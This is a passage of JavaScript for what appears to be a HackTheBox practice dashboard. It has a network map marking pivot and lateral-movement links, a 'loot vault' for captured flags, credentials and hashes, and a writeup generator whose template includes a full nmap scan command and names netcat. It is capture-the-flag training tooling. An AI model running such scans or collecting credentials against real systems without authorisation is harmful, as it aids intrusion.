      const x2=Math.max(...xs)+pad, y2=Math.max(...ys)+pad;
      ctx.save();
      ctx.strokeStyle=net.color||'#1e2635';
      ctx.fillStyle  =(net.color||'#1e2635')+'18';
      ctx.lineWidth=1.5; ctx.setLineDash([6,4]);
      rrect(ctx,x1,y1,x2-x1,y2-y1,12); ctx.fill(); ctx.stroke();
      ctx.setLineDash([]);
      ctx.fillStyle=net.color||'#3e4e62';
      ctx.font='bold 12px "Share Tech Mono",monospace';
      ctx.textAlign='left';
      ctx.fillText((net.cidr||'')+(net.label?' · '+net.label:''), x1+10,y1+18);
      ctx.restore();
    });
  }

  function drawEdge(e) {
    const src=nodes.find(n=>n.id===e.from);
    const dst=nodes.find(n=>n.id===e.to);
    if(!src||!dst) return;
    const tc={pivot:'#a855f7',tunnel:'#22d3ee',lateral:'#ffb300',default:'#3e4e62'};
    ctx.save();
    ctx.strokeStyle=tc[e.type]||tc.default;
    ctx.lineWidth=e.type==='pivot'?2.5:1.5;
    if(e.type==='tunnel') ctx.setLineDash([5,4]);
    ctx.beginPath(); ctx.moveTo(src.x,src.y); ctx.lineTo(dst.x,dst.y); ctx.stroke();
    ctx.setLineDash([]);
    const ang=Math.atan2(dst.y-src.y,dst.x-src.x);
    const ax=dst.x-Math.cos(ang)*(NODE_R+4);
    const ay=dst.y-Math.sin(ang)*(NODE_R+4);
    ctx.beginPath();
    ctx.moveTo(ax,ay);
    ctx.lineTo(ax-10*Math.cos(ang-0.4),ay-10*Math.sin(ang-0.4));
    ctx.lineTo(ax-10*Math.cos(ang+0.4),ay-10*Math.sin(ang+0.4));
    ctx.closePath();
    ctx.fillStyle=tc[e.type]||tc.default; ctx.fill();
    if(e.label){
      ctx.fillStyle='#7a8a9e'; ctx.font='10px "Share Tech Mono",monospace';
      ctx.textAlign='center';
      ctx.fillText(e.label,(src.x+dst.x)/2,(src.y+dst.y)/2-8);
    }
    ctx.restore();
  }

  function drawNode(n) {
    const isHov = hovering===n;
    const isSel = selectedNode&&selectedNode.id===n.id;
    const isMatch = searchTerm && (n.label.toLowerCase().includes(searchTerm)||
                                   (n.ip||'').includes(searchTerm));
    const isDim = searchTerm && !isMatch;
    const color = COLORS[n.status]||COLORS['Unknown'];
    const icon  = ICONS[n.status]||'?';
    ctx.save();
    ctx.globalAlpha = isDim ? 0.25 : 1;
    if(isSel){ ctx.shadowColor=color; ctx.shadowBlur=22; }
    else if(isHov){ ctx.shadowColor=color; ctx.shadowBlur=12; }
    else if(isMatch){ ctx.shadowColor=color; ctx.shadowBlur=16; }
    ctx.beginPath(); ctx.arc(n.x,n.y,NODE_R+(isSel?3:0),0,Math.PI*2);
    ctx.strokeStyle=isSel?color:color+'60'; ctx.lineWidth=isSel?2.5:1.5; ctx.stroke();
    const isDark=!document.body.classList.contains('light');
    ctx.beginPath(); ctx.arc(n.x,n.y,NODE_R-1,0,Math.PI*2);
    ctx.fillStyle=isDark?'#161b24':'#ffffff'; ctx.fill();
    ctx.beginPath(); ctx.arc(n.x,n.y,NODE_R-1,0,Math.PI*2);
    ctx.strokeStyle=color+(isSel?'ff':'88'); ctx.lineWidth=2; ctx.stroke();
    ctx.shadowBlur=0;
    ctx.fillStyle=color; ctx.font=`bold 13px "Share Tech Mono",monospace`;
    ctx.textAlign='center'; ctx.textBaseline='middle';
    ctx.fillText(icon,n.x,n.y);
    const lblColor=isDark?(isSel?'#d4dce8':'#7a8a9e'):(isSel?'#1a2230':'#4a5668');
    ctx.fillStyle=lblColor;
    ctx.font=`${isSel?'bold ':''} 11px "Share Tech Mono",monospace`;
    ctx.textBaseline='top';
    ctx.fillText(n.label,n.x,n.y+NODE_R+4);
    if(n.ip){
      ctx.fillStyle='#3e4e62'; ctx.font='10px "Share Tech Mono",monospace';
      ctx.fillText(n.ip,n.x,n.y+NODE_R+17);
    }
    if(n.flags&&n.flags.length>0){
      ctx.beginPath(); ctx.arc(n.x+NODE_R-2,n.y-NODE_R+2,9,0,Math.PI*2);
      ctx.fillStyle='#ff4d4d'; ctx.fill();
      ctx.fillStyle='#fff'; ctx.font='bold 9px sans-serif';
      ctx.textBaseline='middle';
      ctx.fillText(n.flags.length,n.x+NODE_R-2,n.y-NODE_R+2);
    }
    ctx.globalAlpha=1; ctx.restore();
  }

  function drawMinimap() {
    if(!miniCtx||!miniCanvas) return;
    const mW=miniCanvas.width, mH=miniCanvas.height;
    miniCtx.clearRect(0,0,mW,mH);
    if(!nodes.length) return;
    const xs=nodes.map(n=>n.x), ys=nodes.map(n=>n.y);
    const minX=Math.min(...xs)-60, maxX=Math.max(...xs)+60;
    const minY=Math.min(...ys)-60, maxY=Math.max(...ys)+60;
    const scaleX=mW/(maxX-minX||1), scaleY=mH/(maxY-minY||1);
    const ms=Math.min(scaleX,scaleY)*0.9;
    const offX=(mW-(maxX-minX)*ms)/2-minX*ms;
    const offY=(mH-(maxY-minY)*ms)/2-minY*ms;
    nodes.forEach(n=>{
      const mx=n.x*ms+offX, my=n.y*ms+offY;
      miniCtx.beginPath(); miniCtx.arc(mx,my,4,0,Math.PI*2);
      miniCtx.fillStyle=COLORS[n.status]||'#3e4e62'; miniCtx.fill();
    });
    const vx1=(-panX/scale)*ms+offX, vy1=(-panY/scale)*ms+offY;
    const vw=(W/scale)*ms, vh=(H/scale)*ms;
    miniCtx.strokeStyle='rgba(0,255,153,0.5)'; miniCtx.lineWidth=1.5;
    miniCtx.strokeRect(vx1,vy1,vw,vh);
  }

  function rrect(ctx,x,y,w,h,r){
    ctx.beginPath();
    ctx.moveTo(x+r,y);
    ctx.lineTo(x+w-r,y); ctx.arcTo(x+w,y,x+w,y+r,r);
    ctx.lineTo(x+w,y+h-r); ctx.arcTo(x+w,y+h,x+w-r,y+h,r);
    ctx.lineTo(x+r,y+h); ctx.arcTo(x,y+h,x,y+h-r,r);
    ctx.lineTo(x,y+r); ctx.arcTo(x,y,x+r,y,r);
    ctx.closePath();
  }

  const tooltip=()=>document.getElementById('node-tooltip');
  function showTooltip(n,cx,cy){
    const t=tooltip(); if(!t) return;
    t.style.display='block'; t.style.left=(cx+14)+'px'; t.style.top=(cy+14)+'px';
    const flags=n.flags&&n.flags.length?n.flags.map(f=>`<div style="color:var(--red);margin-top:2px">🚩 ${esc(f)}</div>`).join(''):'';
    t.innerHTML=`<div style="color:var(--green);font-weight:700;margin-bottom:4px">${esc(n.label)}</div>
      ${n.ip?`<div style="color:var(--blue)">${esc(n.ip)}</div>`:''}
      <div style="color:var(--text2);margin-top:3px">${esc(n.status)}</div>
      ${n.os?`<div style="color:var(--text2)">${esc(n.os)}</div>`:''}
      ${flags}
      <div style="color:var(--text3);margin-top:6px;font-size:10px">right-click for options · dbl-click to edit</div>`;
  }
  function hideTooltip(){const t=tooltip();if(t)t.style.display='none';}

  function selectNode(n){
    selectedNode=n; draw();
    const panel=document.getElementById('node-detail-panel');
    panel.style.display='flex';
    document.getElementById('node-detail-name').textContent=n.label;
    document.getElementById('node-detail-ip').textContent=n.ip||'';
    document.getElementById('node-status-select').value=n.status;
    document.getElementById('node-notes-ta').value=n.notes||'';
    renderNodeFlags(n);
  }

  function renderNodeFlags(n){
    const el=document.getElementById('node-flags-list');
    if(!n.flags||!n.flags.length){el.innerHTML='<span style="color:var(--text3);font-family:var(--mono);font-size:11px">No flags captured yet</span>';return;}
    el.innerHTML=n.flags.map((f,i)=>`
      <div class="loot-row" style="margin-bottom:4px">
        <span class="loot-val">🚩 ${esc(f)}</span>
        <button class="btn btn-ghost btn-xs" onclick="NetMap.removeFlagFromNode(${i})">✕</button>
      </div>`).join('');
  }

  function addFlagToNode(){
    if(!selectedNode) return;
    const val=document.getElementById('node-flag-input').value.trim();
    if(!val) return;
    if(!selectedNode.flags) selectedNode.flags=[];
    selectedNode.flags.push(val);
    document.getElementById('node-flag-input').value='';
    saveMapState(); renderNodeFlags(selectedNode); draw();
    toast('Flag added to '+selectedNode.label);
  }

  function removeFlagFromNode(idx){
    if(!selectedNode||!selectedNode.flags) return;
    selectedNode.flags.splice(idx,1);
    saveMapState(); renderNodeFlags(selectedNode); draw();
  }

  function deleteSelectedNode(){
    if(!selectedNode) return;
    nodes=nodes.filter(n=>n.id!==selectedNode.id);
    edges=edges.filter(e=>e.from!==selectedNode.id&&e.to!==selectedNode.id);
    selectedNode=null;
    document.getElementById('node-detail-panel').style.display='none';
    saveMapState(); draw(); renderNetworkList();
    toast('Node removed');
  }

  function updateNodeStatus(){
    if(!selectedNode) return;
    selectedNode.status=document.getElementById('node-status-select').value;
    saveMapState(); draw();
  }

  function updateNodeNotes(){
    if(!selectedNode) return;
    selectedNode.notes=document.getElementById('node-notes-ta').value;
    saveMapState();
  }

  function addNetwork(){
    const cidr=document.getElementById('net-cidr').value.trim();
    const label=document.getElementById('net-label').value.trim();
    const color=document.getElementById('net-color').value;
    if(!cidr){toast('Enter a CIDR','red');return;}
    State.set(s=>{if(!s.networks)s.networks=[];s.networks.push({id:uid(),cidr,label,color});});
    document.getElementById('net-cidr').value=''; document.getElementById('net-label').value='';
    closeModal('network-modal'); renderNetworkList(); draw();
    toast('Network: '+cidr);
  }

  function renderNetworkList(){
    const {networks}=State.get();
    const el=document.getElementById('network-list');
    if(!networks||!networks.length){el.innerHTML='<div class="empty">No networks defined yet.</div>';return;}
    el.innerHTML=networks.map(n=>`
      <div class="flex" style="background:var(--bg3);border:1px solid var(--border);border-radius:var(--r);padding:8px 12px;gap:10px">
        <span style="width:12px;height:12px;border-radius:50%;background:${n.color};flex-shrink:0;display:inline-block"></span>
        <span style="font-family:var(--mono);font-size:12px;color:var(--cyan)">${esc(n.cidr)}</span>
        <span style="font-size:13px;flex:1;color:var(--text2)">${esc(n.label||'')}</span>
        <span style="font-size:11px;font-family:var(--mono);color:var(--text3)">${nodes.filter(nd=>nd.subnet===n.id).length} nodes</span>
        <button class="btn btn-ghost btn-xs" onclick="NetMap.deleteNetwork('${n.id}')">✕</button>
      </div>`).join('');
  }

  function deleteNetwork(id){
    State.set(s=>{s.networks=(s.networks||[]).filter(n=>n.id!==id);});
    renderNetworkList(); draw(); toast('Network removed');
  }

  function populateSubnetSelect(){
    const {networks}=State.get();
    document.getElementById('mapnode-subnet').innerHTML='<option value="">None</option>'+
      (networks||[]).map(n=>`<option value="${n.id}">${esc(n.cidr)} ${esc(n.label||'')}</option>`).join('');
  }

  function addMapNode(){
    const label=document.getElementById('mapnode-label').value.trim();
    const ip=document.getElementById('mapnode-ip').value.trim();
    if(!label){toast('Label required','red');return;}
    const cx=(W/2-panX)/scale+(Math.random()-.5)*160;
    const cy=(H/2-panY)/scale+(Math.random()-.5)*120;
    nodes.push({id:uid(),label,ip,subnet:document.getElementById('mapnode-subnet').value,
      os:document.getElementById('mapnode-os').value,status:document.getElementById('mapnode-status').value,
      flags:[],notes:'',x:cx,y:cy});
    ['mapnode-label','mapnode-ip'].forEach(id=>document.getElementById(id).value='');
    closeModal('mapnode-modal'); saveMapState(); draw(); renderNetworkList();
    toast('Node added: '+label);
  }

  function populateEdgeSelects(){
    const opts=nodes.map(n=>`<option value="${n.id}">${esc(n.label)} (${esc(n.ip||'?')})</option>`).join('');
    document.getElementById('edge-from').innerHTML=opts;
    document.getElementById('edge-to').innerHTML=opts;
  }

  function addEdge(){
    const from=document.getElementById('edge-from').value;
    const to=document.getElementById('edge-to').value;
    const label=document.getElementById('edge-label').value.trim();
    const type=document.getElementById('edge-type').value;
    if(!from||!to||from===to){toast('Select two different nodes','red');return;}
    edges.push({id:uid(),from,to,label,type});
    document.getElementById('edge-label').value='';
    closeModal('edge-modal'); saveMapState(); draw();
    toast('Edge added');
  }

  function importFromMachines(){
    const {machines}=State.get(); let added=0;
    machines.forEach(m=>{
      if(nodes.find(n=>n.ip===m.ip)) return;
      const cx=120+Math.random()*(W-240);
      const cy=100+Math.random()*(H-200);
      nodes.push({id:uid(),label:m.name,ip:m.ip,os:m.os,status:m.status,subnet:'',flags:[],notes:'',x:cx,y:cy});
      added++;
    });
    if(!added){toast('All machines already on map');return;}
    saveMapState(); draw(); renderNetworkList();
    toast(`Imported ${added} machine(s)`);
  }

  return { init, draw, addFlagToNode, removeFlagFromNode, deleteSelectedNode, deleteNetwork };
})();


// ═══════════════════════════════════════════════
//  LOOT VAULT
// ═══════════════════════════════════════════════
const Loot = (() => {
  function init() {
    document.getElementById('btn-add-loot').addEventListener('click', addLoot);
    document.querySelectorAll('.loot-filter-btn').forEach(b => {
      b.addEventListener('click', () => {
        document.querySelectorAll('.loot-filter-btn').forEach(x=>x.classList.remove('active-filter'));
        b.classList.add('active-filter');
        State.set(s => { s.lootFilter = b.dataset.f; });
        render();
      });
    });
  }

  function addLoot() {
    const val = document.getElementById('l-value').value.trim();
    if (!val) { toast('Enter a value', 'red'); return; }
    const machineId = document.getElementById('l-machine').value;
    const { machines } = State.get();
    const m = machines.find(x => x.id === machineId);
    State.set(s => {
      s.loot.push({
        id: uid(),
        type:  document.getElementById('l-type').value,
        machine:   m ? m.name : 'General',
        machineId,
        desc:  document.getElementById('l-desc').value.trim(),
        value: val,
        added: Date.now(),
      });
    });
    document.getElementById('l-value').value = '';
    document.getElementById('l-desc').value  = '';
    render();
    toast('Loot saved');
  }

  function deleteLoot(id) {
    State.set(s => { s.loot = s.loot.filter(x => x.id !== id); });
    render();
    toast('Removed');
  }

  function render() {
    const { loot, lootFilter } = State.get();
    const f = lootFilter || 'ALL';
    const items = f === 'ALL' ? loot : loot.filter(l => l.type === f);
    const el = document.getElementById('loot-list');

    if (!items.length) { el.innerHTML = '<div class="empty">No loot in this category.</div>'; return; }

    const typeIcon   = { FLAG:'🚩', CRED:'🔑', HASH:'🔒', FILE:'📄', NOTE:'📝', SECRET:'🔐' };
    const typeBadge  = { FLAG:'bg',  CRED:'ba',  HASH:'br',  FILE:'bb',  NOTE:'bp', SECRET:'bc' };

    el.innerHTML = [...items].reverse().map(l => `
      <div class="loot-row">
        <span class="badge ${typeBadge[l.type]||'bgr'}" style="flex-shrink:0">${typeIcon[l.type]||''} ${l.type}</span>
        <div style="flex:1;min-width:0">
          ${l.desc ? `<div style="font-size:11px;color:var(--text2);margin-bottom:2px">${esc(l.desc)}</div>` : ''}
          <div class="loot-val">${esc(l.value)}</div>
        </div>
        <span style="font-size:11px;color:var(--text3);white-space:nowrap;font-family:var(--mono)">${esc(l.machine)}</span>
        <button class="btn btn-ghost btn-xs" onclick="navigator.clipboard.writeText('${l.value.replace(/'/g,"\\'")}').then(()=>toast('Copied'))">COPY</button>
        <button class="btn btn-ghost btn-xs" onclick="Loot.deleteLoot('${l.id}')">✕</button>
      </div>
    `).join('');
  }

  return { init, render, addLoot, deleteLoot };
})();


// ═══════════════════════════════════════════════
//  WRITEUP
// ═══════════════════════════════════════════════
const Writeup = (() => {
  function init() {
    document.getElementById('writeup-machine').addEventListener('change', generate);
    document.getElementById('btn-copy-writeup').addEventListener('click', () => {
      copyText(document.getElementById('writeup-area').value);
      flashCopy(document.getElementById('btn-copy-writeup'));
    });
    document.getElementById('btn-gen-writeup').addEventListener('click', generate);
  }

  function generate() {
    const id = document.getElementById('writeup-machine').value;
    if (!id) return;
    const { machines, ports, notes, loot } = State.get();
    const m = machines.find(x => x.id === id);
    if (!m) return;

    const portLines = (ports[id]||[])
      .sort((a,b)=>parseInt(a.port)-parseInt(b.port))
      .map(p => `- ${p.port}/${p.proto} — ${p.service} ${p.version||''}`.trimEnd())
      .join('\n') || '- None recorded';

    const flags = loot.filter(l=>l.machineId===id&&l.type==='FLAG')
      .map(l=>`- ${l.desc||'Flag'}: \`${l.value}\``).join('\n') || '- None';

    const creds = loot.filter(l=>l.machineId===id&&l.type==='CRED')
      .map(l=>`- ${l.desc||''}: \`${l.value}\``).join('\n') || '- None';

    const md = `# ${m.name} — HackTheBox Writeup
> **IP**: \`${m.ip}\` | **OS**: ${m.os} | **Difficulty**: ${m.diff} | **Status**: ${m.status}

---

## Summary

*Brief overview of attack path and techniques used.*

---

## Reconnaissance

\`\`\`
nmap -sCV -p- ${m.ip} -oN nmap/full.txt
\`\`\`

**Open Ports**

${portLines}

---

## Enumeration

*Detailed enumeration of discovered services.*

---

## Initial Foothold

${notes[id] || '*Document your foothold steps here.*'}

---

## Privilege Escalation

*Document the privesc path here.*

---

## Flags

${flags}

---

## Credentials

${creds}

---

## Tools Used

- nmap, feroxbuster, netcat
- (add more)

---

## Key Takeaways

*What vulnerability class? What was the lesson?*

---
*Generated by HTB Dashboard*`;

    document.getElementById('writeup-area').value = md;
  }

  return { init, generate };
})();


// ═══════════════════════════════════════════════
//  APP BOOTSTRAP
// ═══════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
  State.load();
  Machines.init();
  Recon.init();
  Payloads.init();
  NetMap.init();
  Loot.init();
  Writeup.init();

  Machines.render();
  Loot.render();

  // Page navigation
  document.querySelectorAll('.nav-item[data-page]').forEach(item => {
    item.addEventListener('click', () => navigateTo(item.dataset.page));
  });

  function navigateTo(pageId) {
    document.querySelectorAll('.nav-item').forEach(x => x.classList.remove('active'));
    document.querySelectorAll('.page').forEach(x => x.classList.remove('active'));
    const navItem = document.querySelector('.nav-item[data-page="' + pageId + '"]');
    const page    = document.getElementById('page-' + pageId);
    if (navItem) navItem.classList.add('active');
    if (page)    page.classList.add('active');
    if (pageId === 'recon')    Recon.refreshSelect();
    if (pageId === 'loot')     { Machines.refreshAllSelects(); Loot.render(); }
    if (pageId === 'writeup')  { Machines.refreshAllSelects(); }
    if (pageId === 'netmap')   { setTimeout(() => NetMap.draw(), 50); }
    if (pageId === 'machines') Machines.render();
    updateNavBadges();
  }

  function updateNavBadges() {
    const s = State.get();
    document.getElementById('nav-badge-machines').textContent = s.machines.length;
    document.getElementById('nav-badge-loot').textContent     = s.loot.length;
  }

  // Session clock
  const sessionStart = Date.now();
  setInterval(() => {
    const el = document.getElementById('session-time');
    if (!el) return;
    const sec = Math.floor((Date.now() - sessionStart) / 1000);
    const h = String(Math.floor(sec / 3600)).padStart(2,'0');
    const m = String(Math.floor((sec % 3600) / 60)).padStart(2,'0');
    const s = String(sec % 60).padStart(2,'0');
    el.textContent = 'SESSION ' + h + ':' + m + ':' + s;
  }, 1000);

  // Restore active machine pill
  const { activeMachine, machines } = State.get();
  if (activeMachine) {
    const m = machines.find(x => x.id === activeMachine);
    if (m) {
      document.getElementById('active-target-badge').textContent = m.name + '  ·  ' + m.ip;
      document.getElementById('active-target-pill').style.display = 'flex';
    }
  }

  // Restore saved theme
  if (localStorage.getItem('htb_theme') === 'light') applyTheme('light');

  updateNavBadges();
});


// ═══════════════════════════════════════════════
//  THEME
// ═══════════════════════════════════════════════
const App = {
  toggleTheme() {
    applyTheme(document.body.classList.contains('light') ? 'dark' : 'light');
  }
};

function applyTheme(theme) {
  const btn = document.getElementById('btn-theme');
  if (theme === 'light') {
    document.body.classList.add('light');
    if (btn) btn.innerHTML = '<span>🌙</span> DARK';
    localStorage.setItem('htb_theme', 'light');
  } else {
    document.body.classList.remove('light');
    if (btn) btn.innerHTML = '<span>☀</span> LIGHT';
    localStorage.setItem('htb_theme', 'dark');
  }
  if (typeof NetMap !== 'undefined') setTimeout(() => NetMap.draw(), 30);
}
